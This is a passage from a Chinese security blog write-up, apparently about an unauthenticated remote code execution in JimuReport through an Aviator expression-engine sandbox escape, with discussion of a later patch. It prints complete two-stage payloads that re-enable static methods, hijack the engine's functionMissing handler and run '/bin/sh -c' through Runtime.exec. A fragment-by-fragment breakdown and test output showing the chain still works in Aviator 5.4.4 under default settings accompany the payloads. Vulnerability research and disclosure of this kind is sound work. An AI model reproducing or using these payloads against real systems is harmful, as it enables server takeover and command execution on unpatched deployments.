+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">=seq.put(__env__, &#x27;instance&#x27;, __instance__);</span><br><span class="line">seq.put(__env__, &#x27;env&#x27;, __env__);</span><br><span class="line">for x in instance.features &#123;</span><br><span class="line">  seq.put(instance.funcMap, &#x27;_sm&#x27;, x.declaringClass.enumConstants[16]);</span><br><span class="line">  seq.put(instance.funcMap, &#x27;_fn&#x27;, x.declaringClass.enumConstants[8])</span><br><span class="line">&#125;;</span><br><span class="line">seq.add(instance.features, seq.get(instance.funcMap, &#x27;_sm&#x27;));</span><br><span class="line">seq.add(instance.features, seq.get(instance.funcMap, &#x27;_fn&#x27;));</span><br><span class="line">seq.put(env, &#x27;c&#x27;, instance.Class);</span><br><span class="line">seq.put(env, &#x27;CC&#x27;, c.Class);</span><br><span class="line">seq.put(env, &#x27;FM&#x27;, CC.forName(</span><br><span class="line">  &#x27;com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing&#x27;));</span><br><span class="line">seq.put(env, &#x27;RF&#x27;, CC.forName(</span><br><span class="line">  &#x27;com.googlecode.aviator.utils.Reflector&#x27;));</span><br><span class="line">RF.setProperty(env, &#x27;instance.functionMissing&#x27;, FM.getInstance())</span><br></pre></td></tr></table></figure>
+
+<p>逐段拆解（ExpressUtil 编译前会替换掉 payload 里所有 &#x3D;，所以不能用 &#x3D; 赋值，只能用 seq.put 往 Env 里写变量）：</p>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>实际语义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__instance__ &#x2F; __env__</td>
+<td>Env.get() 的内部变量，分别返回引擎实例和 Env 自身，只需 InternalVars（默认开）</td>
+</tr>
+<tr>
+<td>seq.put(__env__, ‘instance’, __instance__)</td>
+<td>seq.put 是往 Map 里写键值，而 Env 本身就是 Map；这一行把引擎实例注册成变量 instance，后面就能直接写 instance.features。第二行同理把 Env 注册成 env</td>
+</tr>
+<tr>
+<td>instance.features</td>
+<td>getFeatures()，返回引擎内部活的 Set<Feature>，不是拷贝</td>
+</tr>
+<tr>
+<td>x.declaringClass.enumConstants[16]</td>
+<td>x.getDeclaringClass().getEnumConstants()[16] 得到 Feature.StaticMethods。纯 getter 链，不受 StaticMethods &#x2F; StaticFields 约束</td>
+</tr>
+<tr>
+<td>seq.put(instance.funcMap, …)</td>
+<td>借用引擎公开的 getFuncMap()（也是活的 Map）当草稿纸</td>
+</tr>
+<tr>
+<td>seq.add(instance.features, …)</td>
+<td>把 StaticMethods 加回引擎白名单</td>
+</tr>
+<tr>
+<td>instance.Class 到 c.Class</td>
+<td>两次 getClass()，拿到 java.lang.Class 的 Class 对象</td>
+</tr>
+<tr>
+<td>CC.forName(…)</td>
+<td>静态方法已放行，可以加载任意类</td>
+</tr>
+<tr>
+<td>RF.setProperty(env, ‘instance.functionMissing’, FM.getInstance())</td>
+<td>解析到 setFunctionMissing，把引擎的 functionMissing 改成反射兜底实现</td>
+</tr>
+</tbody></table>
+<p>对照 Aviator 5.2.6 的 Feature 源码，索引 16 是 StaticMethods，也是本链真正必需的核心。这一步的关键在于 getter 路径：x.declaringClass 走 PropertyType.Getter，实际调用 Enum.getDeclaringClass()；拿到 Class 对象后，Aviator 把 target.innerClazz 设成它，而 .enumConstants 在 StaticFields 被禁用的情况下仍会落到 Getter 分支，调用 Class.getEnumConstants()。</p>
+<p>这两个都是公开实例方法，不经过 StaticMethods &#x2F; StaticFields 检查，所以攻击者能直接把白名单里的常量读出来再塞回去。反过来，如果 StaticFields 是开着的，这里会走 StaticField 分支去 Feature 类上找名为 enumConstants 的静态字段，找不到直接返回 null 并抛 NPE，链反而断掉——禁用 StaticFields 恰好把它推到了 getter 分支。</p>
+<p>接下来把函数调用变成任意实例方法调用。functionMissing 是 Aviator 引擎上的一个回调字段：当函数名在 funcMap 里找不到时，就交给它兜底。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AviatorEvaluatorInstance</span></span><br><span class="line"><span class="keyword">private</span> FunctionMissing functionMissing;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RuntimeFunctionDelegator.getFunc()</span></span><br><span class="line"><span class="keyword">if</span> (val <span class="keyword">instanceof</span> AviatorFunction) &#123;</span><br><span class="line">    <span class="keyword">return</span> (AviatorFunction) val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.functionMissing != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConstantFunction</span>(<span class="built_in">this</span>.name,</span><br><span class="line">            <span class="built_in">this</span>.functionMissing.onFunctionMissing(<span class="built_in">this</span>.name, env, args));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctionNotFoundException</span>(<span class="string">&quot;Function not found: &quot;</span> + <span class="built_in">this</span>.name);</span><br></pre></td></tr></table></figure>
+
+<p>而 JavaMethodReflectionFunctionMissing 的实现是：把第一个参数当作 this，其余参数当作方法实参，反射调用同名实例方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> AviatorObject <span class="title function_">onFunctionMissing</span><span class="params">(String name, Map&lt;String, Object&gt; env, AviatorObject... args)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">firstArg</span> <span class="operator">=</span> args[<span class="number">0</span>].getValue(env);          <span class="comment">// 接收者</span></span><br><span class="line">    Class&lt;?&gt; clazz = firstArg.getClass();</span><br><span class="line">    Object[] jArgs = <span class="keyword">new</span> <span class="title class_">Object</span>[args.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; args.length; ++i) &#123;</span><br><span class="line">        jArgs[i - <span class="number">1</span>] = args[i].getValue(env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FunctionUtils.wrapReturn(</span><br><span class="line">            Reflector.invokeInstanceMethod(clazz, name, firstArg,</span><br><span class="line">                    Reflector.getInstanceMethods(clazz, name), jArgs));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一旦 functionMissing 被写成这个实现，exec(r, arr) 就等于反射调用 r.exec(arr)，由此获得任意对象任意公开实例方法的原语。注意 functionMissing 不是 Feature，它走的是 invokeInstanceMethod，整条路径上没有任何 Feature 校验，这是与 StaticMethods 白名单完全独立的一块攻击面。另外，RuntimeFunctionDelegator 在编译表达式时就把 functionMissing 捕获为 final 字段，所以必须先发 step1 污染引擎，再发 step2 编译恶意表达式。</p>
+<p>顺带说清一点：r.exec(arr) 这种「对象点实例方法」的写法是走不通的。Aviator 5.2.6 的点号链最后一段固定按 Getter 解析（只认 getXxx &#x2F; isXxx &#x2F; 字段），PropertyType 枚举本身只有 Getter &#x2F; StaticField &#x2F; StaticMethod 三个值，实例方法根本没有对应分支。实测在默认引擎里 l.add(3)、s.length()、System.out.println(…) 全是 Function not found，只有 getter 形式能用。所以 functionMissing 不是一个更省事的替代写法，而是 5.2.6 下调用任意实例方法的唯一入口。</p>
+<p>payload 里的 RT.getRuntime()、AY.set(arr, 0, …) 能用点号，是因为接收者是 Class 对象、名字只有两段，走的是 StaticMethod 分支，跟这条路径不是一回事。</p>
+<p>step2 的完整 payload：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">=seq.put(__env__, &#x27;instance&#x27;, __instance__);</span><br><span class="line">seq.put(__env__, &#x27;env&#x27;, __env__);</span><br><span class="line">seq.put(env, &#x27;c&#x27;, instance.Class);</span><br><span class="line">seq.put(env, &#x27;CC&#x27;, c.Class);</span><br><span class="line">seq.put(env, &#x27;RT&#x27;, CC.forName(&#x27;java.lang.Runtime&#x27;));</span><br><span class="line">seq.put(env, &#x27;r&#x27;, RT.getRuntime());</span><br><span class="line">seq.put(env, &#x27;AY&#x27;, CC.forName(&#x27;java.lang.reflect.Array&#x27;));</span><br><span class="line">seq.put(env, &#x27;SC&#x27;, CC.forName(&#x27;java.lang.String&#x27;));</span><br><span class="line">seq.put(env, &#x27;arr&#x27;, AY.newInstance(SC, 3));</span><br><span class="line">AY.set(arr, 0, &#x27;/bin/sh&#x27;);</span><br><span class="line">AY.set(arr, 1, &#x27;-c&#x27;);</span><br><span class="line">AY.set(arr, 2, &#x27;&lt;command&gt;&#x27;);</span><br><span class="line">seq.put(env, &#x27;p&#x27;, exec(seq.get(env, &#x27;r&#x27;), seq.get(env, &#x27;arr&#x27;)))</span><br></pre></td></tr></table></figure>
+
+<p>关键片段：</p>
+<ul>
+<li>CC.forName(‘java.lang.Runtime’) 加 RT.getRuntime() 拿到 Runtime 实例，用的是 step1 放行的 StaticMethods</li>
+<li>CC.forName(‘java.lang.reflect.Array’) 加 AY.newInstance(SC, 3) 造出一个 String[3]</li>
+<li>AY.set(arr, 0, ‘&#x2F;bin&#x2F;sh’) 逐个填元素，填的是 &#x2F;bin&#x2F;sh -c command</li>
+<li>exec(r, arr) 走 functionMissing，最终命中 Runtime.exec(String[])</li>
+</ul>
+<p>最后：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RT.getRuntime()                 → Runtime 实例</span><br><span class="line">AY.newInstance(SC, 3)           → String[3]</span><br><span class="line">exec(r, arr)                    → functionMissing → r.exec(arr)</span><br></pre></td></tr></table></figure>
+
+<p>Reflector.invokeMatchingMethod 会在 Runtime 的多个 exec 重载里按参数类型匹配，[String[]] 正好命中 Runtime.exec(String[])，命令随即以应用进程身份执行。</p>
+<h2 id="Break-Fix"><a href="#Break-Fix" class="headerlink" title="Break &amp; Fix"></a>Break &amp; Fix</h2><p>step1 请求（沙箱逃逸）：</p>
+<p><img src="/images/29/2-step1-repeater.png" alt="step1"></p>
+<p>step2 请求（命令执行）：</p>
+<p><img src="/images/29/3-step2-repeater.png" alt="step2"></p>
+<p><img src="/images/29/1-marker.png" alt="marker"></p>
+<p style="text-align: left;">Aviator 5.4.0 的 PR #571（fix: check innerClazz while get property，2023-10-03 合并）给这条 getter 路径补上了类白名单校验：把 Env 里原有的检查抽成 AviatorEvaluatorInstance.checkIfClassIsAllowed，再在 Reflector.fastGetProperty 的 target.innerClazz != null 分支加一次调用。</p>
+
+<p><img src="/images/29/4-fix-diff.png" alt="fix-diff"></p>
+<p style="text-align: left;">在 Class 对象上取成员时，先校验这个类是否在 ALLOWED_CLASS_SET 里</p>
+
+<p>补丁没有改动 ALLOWED_CLASS_SET 的语义：checkIfClassIsAllowed 里 null 依旧表示放行所有类，只有非 null 的白名单才会拦，所以链断不断取决于宿主怎么配。要注意校验对象是 target.innerClazz，也就是上一段刚解析出来的那个 Class，而不是表达式里的 x：x 只是一个 Feature 实例，x.declaringClass 是普通对象上的 getter，照常通过并返回 Feature.class；紧接着的 .enumConstants 要在这个新拿到的 Class 上取成员，才会撞上白名单。JimuReport 配的是空集，这里直接拒绝，functionMissing 保持 null，链断在第一步：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 5.4.4 + ALLOWED_CLASS_SET = emptySet()</span><br><span class="line">x.declaringClass               OK  -&gt; class com.googlecode.aviator.Feature</span><br><span class="line">x.declaringClass.enumConstants ERR -&gt; class com.googlecode.aviator.Feature is not in allowed class set</span><br><span class="line"></span><br><span class="line">[step1] FAIL -&gt; ExpressionRuntimeException: class com.googlecode.aviator.Feature is not in allowed class set, check Options.ALLOWED_CLASS_SET</span><br><span class="line">functionMissing = null</span><br><span class="line">[step2] FAIL -&gt; ExpressionRuntimeException: class com.googlecode.aviator.AviatorEvaluatorInstance is not in allowed class set, check Options.ALLOWED_CLASS_SET</span><br><span class="line">marker = false</span><br></pre></td></tr></table></figure>
+
+<p>反过来，同一份 payload 放到 5.4.4（当前最新发行版，同样带这个补丁）的默认配置（ALLOWED_CLASS_SET &#x3D; null）下仍然是通的，实测命令照旧落地：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aviator = 5.4.4，allowSet = null</span><br><span class="line">[step1] OK</span><br><span class="line">[step2] OK</span><br><span class="line">marker = true</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BC%AA%E9%80%A0-X-Sign-%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">第一步：伪造 X-Sign 绕过认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9AAviator-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%B0-RCE"><span class="toc-number">3.</span> <span class="toc-text">第二步：Aviator 沙箱逃逸到 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-Fix"><span class="toc-number">4.</span> <span class="toc-text">Break &amp; Fix</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&text=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&is_video=false&description=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸&body=Check out this article: https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&name=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&t=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Z3r4y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
